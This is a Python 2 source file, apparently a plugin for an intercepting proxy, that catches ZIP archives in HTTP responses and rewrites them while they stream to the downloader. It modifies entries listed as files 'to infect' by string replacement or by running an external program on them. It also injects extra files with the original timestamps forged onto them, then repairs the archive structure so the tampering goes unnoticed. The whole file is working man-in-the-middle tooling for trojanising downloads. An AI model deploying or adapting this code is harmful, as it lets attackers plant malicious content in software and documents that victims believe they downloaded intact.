#!/usr/bin/env python
# -*- coding: utf-8 -*-
# http://eos.wdcb.ru/eps2/eps02018/htm02018.zip
#


import sys, struct, zlib, re, os
import zipfile, zlib
import string, random
import struct
import tempfile
import json
import subprocess

ZIPContentTypes        = ['application/zip', 'application/x-zip-compressed']
genericZIPContentTypes = ['application/octet-stream']

MIN_ZIP_SIZE = 1000

def ZIPCheck(headers, uri, buffer):

    if "content-length" in headers:
        if int(headers["content-length"]) < MIN_ZIP_SIZE :
            return False
    else:
        return False

    if buffer[:2] != 'PK':
        return False

    contenttype = headers["content-type"]
    if contenttype in ZIPContentTypes:
        return True

    if contenttype in genericZIPContentTypes:
        if '.zip' in uri.lower():
            return True

        if 'content-disposition' in headers:
            if '.zip' in headers['content-disposition'].lower():
                return True

    return False


def randomword(length):
    return ''.join(random.choice(string.lowercase) for i in range(length))

class BloqueLFH:
    '''
        Almacenamiento y tratamiendo de datos de los bloques Local File Header y File Data.
    '''
    ESTRUCTURA_CABECERA = "<4s2B4HL2L2H"
    TAMANO_CABECERA 	= None
    FIRMA 				= "PK\003\004"
    _CIDX_FIRMA			= 0
    _CIDX_FLAGS			= 3
    _CIDX_COMPRESION	= 4
    _CIDX_CRC			= 7
    _CIDX_COMPRIMIDO 	= 8
    _CIDX_DESCOMPRIMIDO = 9
    _CIDX_NOMBRE_LENGTH = 10
    _CIDX_EXTRA_LENGTH 	= 11

    TIMEDATE            = 10

    def __init__(self):
        self.TAMANO_CABECERA = struct.calcsize(self.ESTRUCTURA_CABECERA)
        self.cabecera  = None
        self.sobrante  = ""
        self.contenido = None
        self.nombre = None
        self.extra  = None
        self.datetime = None
        self.size = 0

    def datosBasicos(self):
        return { self.nombre : [
            self.cabecera[self._CIDX_COMPRIMIDO],
            self.cabecera[self._CIDX_DESCOMPRIMIDO],
            self.cabecera[self._CIDX_CRC]
            ]
        }

    def inicializa(self, datos):
        try:
            if len(datos) < self.TAMANO_CABECERA:
                self.sobrante = datos
                return -1
            # cabecera
            aux = datos[:self.TAMANO_CABECERA]
            sdatos = len(datos)
            self.cabecera = struct.unpack(self.ESTRUCTURA_CABECERA, aux)
            inicio_datos = self.TAMANO_CABECERA + self.cabecera[self._CIDX_NOMBRE_LENGTH] + self.cabecera[self._CIDX_EXTRA_LENGTH]
            self.nombre = None
            # campos de longitud variable en cabecera
            if sdatos < inicio_datos:
                self.sobrante = datos
                return -1

            self.nombre = datos[ self.TAMANO_CABECERA : self.TAMANO_CABECERA + self.cabecera[self._CIDX_NOMBRE_LENGTH] ]
            self.extra  = datos[ self.TAMANO_CABECERA + self.cabecera[self._CIDX_NOMBRE_LENGTH] : self.TAMANO_CABECERA + self.cabecera[self._CIDX_NOMBRE_LENGTH] + self.cabecera[self._CIDX_EXTRA_LENGTH]]
            self.datetime =datos[self.TIMEDATE: self.TIMEDATE+4]
            # stream de contenido
            size_datos = self.cabecera[self._CIDX_COMPRIMIDO]
            self.size = inicio_datos + size_datos
            if sdatos < self.size:
                self.sobrante = datos
                return -1 	## bloque incompleto
            elif sdatos > self.size:
                self.contenido = datos[inicio_datos : self.size]
                self.sobrante  = datos[self.size : ]
                if sdatos - self.size <= 4:
                    # print "Resultado -2 (%s) len(datos) - inicio_datos - size_datos: " % self.nombre, len(datos) - inicio_datos - size_datos
                    return -2
                # print "Inicializa %s : datos %d inicio_datos %d size_datos %d" % (self.nombre, len(datos), inicio_datos, size_datos)
                # print "Sobrante (%d): %s" % (len(self.sobrante), str(self.sobrante[:6].encode('hex')))
                # print
                return 1 	## datos sobrantes en bloque
            else:
                self.contenido = datos[inicio_datos : ]
                self.sobrante = ''
                return 0 	## bloque exacto
        except Exception, e:
            self.sobrante = datos
            print "Error inicialia LFH %s: %s" % (Exception,e )
            #print "Inicializa  %s : %s" % (Exception, e)
            return -1 		## unpack error, bloque incompleto

    def serializa(self):
        devolver = struct.pack(self.ESTRUCTURA_CABECERA, *self.cabecera) + self.nombre + self.extra + self.contenido
        return devolver

    def extraeStreamDescomprimido(self):
        return zlib.decompress(self.contenido, -15)

    def actualizaGenerico(self, elQue, aPartirDeDonde, conNombre, condicional = False):
        if aPartirDeDonde != '':
            print "Actualizando sustituyendo cadenas...."

            # descomprimir
            try:
                original = self.extraeStreamDescomprimido()
            except Exception, e:
                print "!! Descompression exception, possible encryption detected. Continuing.. "
                return

            try:
                modificado = original.replace(aPartirDeDonde, elQue, 1)
            except Exception, e:
                print "!! Replace exception: ",e
                return

            try:
                # Compresion temporal en fichero .zip
                tdir = tempfile.gettempdir()
                tzip = os.path.join(os.path.sep, tdir, 'ups.zip')
                fz = zipfile.ZipFile(tzip,'w', zipfile.ZIP_DEFLATED)
                fz.writestr(conNombre, modificado)
                fz.close()
                fh = open(tzip, 'rb')
                fc = fh.read()
                fh.close()
                os.remove(tzip)
                # Actualizacion objeto bloque
                fc = fc[ : fc.find('PK\001\001') ]
                self.inicializa(fc)
            except Exception, e:
                print "!! Compression exception: ",e

    def actualizaExterno(self, command, conNombre, condicional = False):
        if command != "":
            print "Actualizando con programa externo...."
            # descomprimir
            try:
                original = self.extraeStreamDescomprimido()
            except Exception, e:
                print "!! Descompression exception, possible encryption detected. Continuing..  "

                return
            try:
                tdir = tempfile.gettempdir()
                texterno = os.path.join(os.path.sep, tdir, '%s'%randomword(5))
                fh = open(texterno,"wb")
                fh.write(original)
                fh.close()

                print ">> Excuting %s %s"%(command, texterno)
                subprocess.call([command, texterno])

                modificado = open(texterno,"rb").read()
            except Exception, e:
                print "!! subprocess exception: ",e
                return

            try:
                # Compresion temporal en fichero .zip
                tdir = tempfile.gettempdir()
                tzip = os.path.join(os.path.sep, tdir, '%s_ups.zip'%randomword(5))
                fz = zipfile.ZipFile(tzip,'w', zipfile.ZIP_DEFLATED)
                fz.writestr(conNombre, modificado)
                fz.close()
                fh = open(tzip, 'rb')
                fc = fh.read()
                fh.close()
                os.remove(tzip)
                # Actualizacion objeto bloque
                fc = fc[ : fc.find('PK\001\001') ]
                self.inicializa(fc)
            except Exception, e:
                print "!! Compression exception: ",e

    def insertaEmbedido(self, injectObjects, timedate):
        try:
            a = injectObjects
            b = []
            for c in a:
                # leemos fichero
                with open(c[0], 'rb') as fhole:
                    fcole = fhole.read()
                tdir = tempfile.gettempdir()
                tzip = os.path.join(os.path.sep, tdir, 'ups.zip')
                # lo comprimimos en fichero temporal
                with zipfile.ZipFile(tzip,'w', zipfile.ZIP_DEFLATED) as fz:
                    fz.writestr(c[1], fcole)
                    fz.close()
                # leemos su contenido y lo borramos.
                with open(tzip, 'rb') as fh:
                    fc = fh.read()
                    fh.close()
                os.remove(tzip)
                #
                fc = fc[:self.TIMEDATE] + timedate + fc[self.TIMEDATE+4:]
                objFH = BloqueLFH()
                objFH.inicializa(fc)
                print "InsertaEmbebido %s LFH %s" % (c[1], str(fc[:4].encode('hex')))

                zfd = objFH.sobrante[:self.TIMEDATE+2] + timedate + objFH.sobrante[self.TIMEDATE+6:]
                #zfd = objFH.sobrante
                objCD = BloqueCDFH()
                objCD.inicializa(zfd)
                print "InsertaEmbebido %s CDFH %s" % (c[1], str(zfd[:4].encode('hex')))

                b.append( (objFH, objCD) )
            return b
        except Exception, e:
            print "Error insertaEmbebido %s : %s" % (Exception, e)
            return None

class BloqueCDFH:
    '''
        Almacenamiento y tratamiento de datos de los bloques 'Central Directory Record'
    '''
    ESTRUCTURA_CABECERA 	= "<4s4B4HL2L5H2L"
    TAMANO_CABECERA 		= None
    FIRMA 					= "PK\001\002"
    _CIDX_FIRMA				= 0
    _CIDX_FLAGS				= 5
    _CIDX_COMPRESION		= 6
    _CIDX_CRC				= 9
    _CIDX_COMPRIMIDO 		= 10
    _CIDX_DESCOMPRIMIDO 	= 11
    _CIDX_NOMBRE_LENGTH 	= 12
    _CIDX_EXTRA_LENGTH 		= 13
    _CIDX_COMMENT_LENGTH	= 14
    _CIDX_LH_OFFSET 		= 18

    def __init__(self):
        self.TAMANO_CABECERA = struct.calcsize(self.ESTRUCTURA_CABECERA)
        self.cabecera  = None
        self.sobrante  = ""
        self.nombre = None
        self.extra  = None
        self.contenido = None

    def inicializa(self, datos):
        try:
            if len(datos) < self.TAMANO_CABECERA:
                # print "Pocos datos necesitamos mas (CDFH < cabecera)  len datos (%d)" % len(datos)
                self.sobrante = datos
                return -1

            # cabecera
            aux = datos[:self.TAMANO_CABECERA]
            self.cabecera = struct.unpack(self.ESTRUCTURA_CABECERA, aux)
            # campos de longitud variable en cabecera

            nPos = self.TAMANO_CABECERA
            ePos = self.TAMANO_CABECERA + self.cabecera[self._CIDX_NOMBRE_LENGTH]
            cPos = self.TAMANO_CABECERA + self.cabecera[self._CIDX_NOMBRE_LENGTH] + self.cabecera[self._CIDX_EXTRA_LENGTH]

            if len(datos) < ePos:
                # print "Pocos datos necesitamos mas (CDFH < ePos) len datos (%d)" % len(datos)
                # print "header : ",str(aux.encode('hex'))
                self.sobrante = datos
                return -1

            self.nombre = datos[ nPos : nPos + self.cabecera[self._CIDX_NOMBRE_LENGTH] ]
            self.extra  = datos[ ePos : ePos + self.cabecera[self._CIDX_EXTRA_LENGTH]]

            if len(datos) < cPos:
                self.sobrante = datos
                return -1 	## bloque incompleto
            elif len(datos) > cPos:
                self.contenido = datos[: cPos]
                self.sobrante  = datos[ cPos : ]
                if len(datos) - cPos < 4:
                    return -2
                # print 'Nombre fichero ', self.nombre
                return 1 	## datos sobrantes en bloque
            else:
                self.contenido = datos
                return 0 	## bloque exacto
        except Exception, e:
            self.sobrante = datos
            print "inicializa CDFH %s : %s " % (Exception, e)
            return -1 		## unpack error, bloque incompleto

    def actualiza(self, datos):
        cbc = list(self.cabecera)
        cbc[self._CIDX_COMPRIMIDO] = datos[0]
        cbc[self._CIDX_DESCOMPRIMIDO] = datos[1]
        cbc[self._CIDX_CRC] = datos[2]
        cbc[self._CIDX_LH_OFFSET] = datos[3]
        self.cabecera = tuple(cbc)

    def serializa(self):
        return struct.pack(self.ESTRUCTURA_CABECERA, *self.cabecera) + self.nombre + self.extra

class BloqueEOCDR:
    '''
        Almacenamiento y tratamiento del End Of Central Directory Record
    '''
    ESTRUCTURA_CABECERA = "<4s4H2LH"
    TAMANO_CABECERA 	= None
    FIRMA 				= "PK\005\006"
    _CIDX_FIRMA			= 0
    _CIDX_EDISK 		= 3
    _CIDX_ETOTAL 		= 4
    _CIDX_CDSIZE 		= 5
    _CIDX_CD_OFFSET     = 6
    _CIDX_COMENT_LENGTH = 7

    def __init__(self):
        self.TAMANO_CABECERA = struct.calcsize(self.ESTRUCTURA_CABECERA)
        self.cabecera  = None
        self.sobrante  = ""
        self.comentarios  = None
        self.nombre = "EOCDR"
        self.contenido = ''

    def inicializa(self, datos):
        try:
            if len(datos) < self.TAMANO_CABECERA:
                # print "Pocos datos necesitamos mas (EOCDR)"
                self.sobrante = datos
                return -1
            # cabecera
            aux = datos[:self.TAMANO_CABECERA]
            self.cabecera = struct.unpack(self.ESTRUCTURA_CABECERA, aux)
            # campos de longitud variable en cabecera
            self.comentarios  = datos[ self.TAMANO_CABECERA : self.TAMANO_CABECERA + self.cabecera[self._CIDX_COMENT_LENGTH] ]
            size_total = self.TAMANO_CABECERA + self.cabecera[self._CIDX_COMENT_LENGTH]
            # print 'EOCDR size %d' % size_total

            if len(datos) < size_total:
                self.sobrante = datos
                return -1 	## bloque incompleto
            elif len(datos) > size_total:
                self.contenido = datos[ :size_total]
                self.sobrante  = datos[ size_total : ]
                return 1 	## datos sobrantes en bloque
            else:
                self.contenido = datos
                return 0 	## bloque exacto
        except Exception, e:
            self.sobrante = datos
            return -1 		## unpack error, bloque incompleto

    def serializa(self):
        return struct.pack(self.ESTRUCTURA_CABECERA, *self.cabecera) + self.comentarios

    def actualizaDesplazamientos(self,off, total_entradas, size_CD):
        cbc = list(self.cabecera)
        cbc[self._CIDX_CD_OFFSET] = off
        cbc[self._CIDX_EDISK] 	  = total_entradas
        cbc[self._CIDX_ETOTAL]    = total_entradas
        cbc[self._CIDX_CDSIZE] 	  = size_CD
        self.cabecera = tuple(cbc)

class ZIPHandler:

    BLOQUE_INCOMPLETO 	= -1
    BLOQUE_COMPLETO  	= 0
    BLOQUE_MULTIPLE 	= 1
    BLOQUE_MULPROC 	    = -2
    TIPO_BLOQUE_LFH 	= 0
    TIPO_BLOQUE_CDFH 	= 1
    TIPO_BLOQUE_EOCDR 	= 2
    TIPO_BLOQUE_DESC 	= 3
    BLOQUE_VACIO 		= 0
    numero_bloque_LFH   = 0
    numero_bloque_CDFH  = 0

    nuevoComprimido = nuevoDescomprimido = nuevo_crc32 = offsetDiff = 0

    configuration = None
    injectObjects = None

    tipo = None

    def __init__(self, zip_config, headers, uri):
        self.por_tratar = ""
        self.TipoDatosActuales = 0
        self.DatosBloques = {
            0: ( BloqueLFH(),   'PK\003\004'),
            1: ( BloqueCDFH(),  'PK\001\002'),
            2: ( BloqueEOCDR(), 'PK\005\006'),
            3: ( None,          'PK\x07\x08')
        }

        self.offset_LFH  = 0
        self.size_CD     = 0
        self.referencias = {}
        self.objetos     = None
        self.listaLFH    = []
        self.configuration = json.loads(open(zip_config).read())
        self.por_enviar = 0
        self.datetime = 0
        self.encription = False

        contenttype = headers["content-type"]
        if contenttype in ZIPContentTypes:
            self.tipo = "zip"

        if contenttype in genericZIPContentTypes:
            extension = uri[-4:].lower()
            if extension == ".zip":
                self.tipo = "zip"

        self.injectObjects = self.configuration[self.tipo]["add"]
        if len(self.injectObjects) > 0:
            self.inyectar = True
        else:
            self.inyectar = False
        print "> ZIP detected - Handling response for Content-Type %s" % headers["content-type"]

        self.nombres_infectar = {}
        self.extension_infectar = {}

        for fichero in self.configuration[self.tipo]["mod"]:
            if fichero['name'] != '':
                self.nombres_infectar[fichero['name']] = int(fichero['size'])
            if fichero['extension'] != '':
                self.extension_infectar[fichero['extension']] = int(fichero['size'])

        #print "> DOCX detected Handling response for Content-Type %s" % response.getheader('Content-Type')
        self.tiposbloques = len(self.DatosBloques)

    def Bind(self, data, datalen, contentlength = 0, downloaded_name='temporal.zip'):
        return self.BlockHandler(data, datalen, contentlength, downloaded_name)

    def BlockHandler(self, data, datalen, contentlength = 0, downloaded_name='temporal.zip'):

        aEnviar = ''

        if self.por_enviar > 0:
            if len(data) > self.por_enviar:
                aEnviar += data[:self.por_enviar]
                self.por_tratar = data[self.por_enviar:]
                #print 'enviando %d de %d datos / siguiente bloque %s' % (self.por_enviar, len(data), str(self.por_tratar[:4].encode('hex')))
                self.por_enviar = 0
            else:
                aEnviar += data
                self.por_enviar -= len(data)
                self.por_tratar = ''
                #print 'enviando %d queda %d ' % (len(data), self.por_enviar)
                return aEnviar, 0, 0
        else:
            self.por_tratar += data

        TodoAnalizado 	= False
        while not TodoAnalizado:
            try:
                spor_tratar = len(self.por_tratar)
                if ( spor_tratar < 22 and self.TipoDatosActuales == self.TIPO_BLOQUE_CDFH) or (spor_tratar < 50 and (self.TipoDatosActuales == self.TIPO_BLOQUE_LFH or self.TipoDatosActuales == self.TIPO_BLOQUE_DESC)):
                    # print 'Necesito más...'
                    # TodoAnalizado = True
                    break

                for TipoDato in range(self.tiposbloques+1):
                    if TipoDato == self.tiposbloques:
                        estado = self.BLOQUE_INCOMPLETO
                        print "* Error at ZIP format.... (header %s)" % str(self.por_tratar[:4].encode('hex'))
                        sys.exit(0)
                        break

                    objPK, firmaActual = self.DatosBloques[TipoDato]
                    self.TipoDatosActuales = TipoDato
                    if objPK is not None and firmaActual == self.por_tratar[:4]:
                        estado = objPK.inicializa(self.por_tratar)
                        self.por_tratar = objPK.sobrante
                        break

                    if TipoDato == self.TIPO_BLOQUE_DESC and firmaActual == self.por_tratar[:4]:

                        if not self.encription:
                            print '>> Encription detected....'
                            self.encription = True
                        aEnviar+=self.por_tratar[:16]
                        self.por_tratar = self.por_tratar[16:]
                        self.offset_LFH += 16
                        estado = self.BLOQUE_MULTIPLE
                        break



                if estado == self.BLOQUE_INCOMPLETO:
                    if self.TipoDatosActuales == self.TIPO_BLOQUE_LFH and objPK.nombre is not None:
                        if objPK.nombre in self.nombres_infectar and not self.encription:
                            if objPK.size <= self.nombres_infectar[objPK.nombre] and self.nombres_infectar[objPK.nombre] > 0:
                                break
                            print '> Avoiding update %s cause size %d' % (objPK.nombre, objPK.size)

                        if objPK.nombre[objPK.nombre.rfind('.'):] in self.extension_infectar and not self.encription:
                            pextension = objPK.nombre[objPK.nombre.rfind('.'):]
                            if objPK.size <= self.extension_infectar[pextension] and self.extension_infectar[pextension] > 0:
                                break
                            print '> Avoiding update %s cause size %d' % (objPK.nombre, objPK.size)

                        self.datetime = objPK.datetime
                        # print '%d LFH %s (%d / %d) estado: %d' % (self.numero_bloque_LFH, objPK.nombre, len(self.por_tratar), objPK.size, estado)
                        self.listaLFH.append(objPK.nombre)
                        self.numero_bloque_LFH += 1
                        self.por_enviar = objPK.size - len(self.por_tratar)
                        self.numero_bloque_LFH +=1
                        aEnviar += self.por_tratar
                        self.por_tratar = ''
                        dBasicos = objPK.datosBasicos()
                        dBasicos[dBasicos.keys()[0]].append(self.offset_LFH)
                        self.referencias.update(dBasicos)
                        self.offset_LFH += objPK.size
                    # TodoAnalizado = True
                    break

                self.por_enviar = 0

                if self.TipoDatosActuales == self.TIPO_BLOQUE_LFH:
                    self.listaLFH.append(objPK.nombre)
                    # print '%d LFH %s (%d) estado: %d resta %d' % (self.numero_bloque_LFH, objPK.nombre, len(objPK.contenido), estado, len(self.por_tratar))
                    self.numero_bloque_LFH += 1
                    self.datetime = objPK.datetime
                    # Modificación elementos en el array
                    if not self.encription:
                        pextension = objPK.nombre[objPK.nombre.rfind('.'):]
                        if objPK.nombre in self.nombres_infectar or pextension in self.extension_infectar:
                            for fichero in self.configuration[self.tipo]["mod"]:
                                lene = len(fichero["extension"])
                                if (fichero["name"] == objPK.nombre or (fichero["extension"] == objPK.nombre[0-lene:].lower())):
                                    if (fichero['size'] == 0 or objPK.size <= fichero['size']):
                                        print "> Updating file ", objPK.nombre
                                        if len(fichero["command"]) > 0:
                                            objPK.actualizaExterno(fichero["command"], objPK.nombre)
                                        elif len(fichero["old"]) > 0 and len(fichero["new"]) > 0:
                                                objPK.actualizaGenerico(fichero["new"].encode("utf-8"), fichero["old"].encode("utf-8"), objPK.nombre)
                                    else:
                                        print "> Avoiding update %s cause size %d" % (objPK.nombre, objPK.size)


                    dBasicos = objPK.datosBasicos()
                    dBasicos[dBasicos.keys()[0]].append(self.offset_LFH)
                    self.referencias.update(dBasicos)

                    aEnviar += objPK.serializa()
                    self.offset_LFH += len(objPK.serializa())

                elif self.TipoDatosActuales == self.TIPO_BLOQUE_CDFH:
                    if self.inyectar:
                        objIN = BloqueLFH()
                        if len(self.injectObjects) > 0:
                            print "> INSERTING files"
                            self.numero_bloque_LFH += len(self.injectObjects)

                            self.objetos = objIN.insertaEmbedido(self.injectObjects, self.datetime)

                            if self.objetos is not None:
                                for b in self.objetos:
                                    dBasicos = b[0].datosBasicos()
                                    dBasicos[dBasicos.keys()[0]].append(self.offset_LFH)
                                    self.referencias.update(dBasicos)
                                    aEnviar += b[0].serializa()
                                    self.offset_LFH += len(b[0].serializa())
                            print '> End Inserting....'
                            self.inyectar = False

                    # print '%d CDFH %s (%d) resta (%d)' % (self.numero_bloque_CDFH, objPK.nombre, len(objPK.contenido), len(self.por_tratar))
                    # if self.listaLFH[self.numero_bloque_CDFH] != objPK.nombre:
                    #      print ' (%d) Diferente!!!' % self.numero_bloque_CDFH

                    self.numero_bloque_CDFH += 1
                    #print '[--] CDFH ', objPK.nombre
                    objPK.actualiza(self.referencias[objPK.nombre])
                    aEnviar += objPK.serializa()
                    self.size_CD += len(objPK.serializa())
                    self.por_enviar = 0
                elif self.TipoDatosActuales == self.TIPO_BLOQUE_EOCDR:
                    if not self.inyectar:
                        self.inyectar = True
                        if self.objetos is not None :
                            for b in self.objetos:
                                b[1].actualiza(self.referencias[b[1].nombre])
                                aEnviar += b[1].serializa()
                                self.size_CD += len(b[1].serializa())
                            self.objetos = None

                    # print 'Bloque EOCDR (%d): ' % len(objPK.contenido), objPK.nombre
                    # actualizar offset del CD
                    objPK.actualizaDesplazamientos(self.offset_LFH, len(self.referencias), self.size_CD)
                    TodoAnalizado = True
                    aEnviar += objPK.serializa()
                    print "> WORK Finished\n\n"

                if estado == self.BLOQUE_MULPROC:
                    TodoAnalizado = True


            except Exception, e:
                print "Excepcion en el Handler %s: %s" % (Exception, e)
                sys.exit(0)
                pass

        return aEnviar, 0, 0

    def Padding(self):
        return None